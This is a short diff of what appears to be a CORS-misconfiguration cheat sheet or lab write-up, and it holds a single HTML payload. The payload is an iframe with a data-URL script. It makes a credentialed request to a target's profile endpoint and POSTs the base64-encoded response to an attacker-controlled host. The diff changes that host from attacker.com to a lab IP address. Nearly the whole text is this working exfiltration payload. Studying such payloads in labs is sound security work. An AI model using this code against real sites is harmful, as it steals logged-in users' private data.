@@ -17,10 +17,10 @@ HTML
 ```
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
     var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://victim.com/api/data', true);
+    xhr.open('GET', 'https://cors-misconfigs.htb/profile.php', true);
     xhr.withCredentials = true; 
     xhr.onload = () => {
-        fetch('https://attacker.com/log', {method:'POST', body: btoa(xhr.responseText)});
+        fetch('https://10.10.17.142', {method:'POST', body: btoa(xhr.responseText)});
     };
     xhr.send();
 </script>"></iframe>
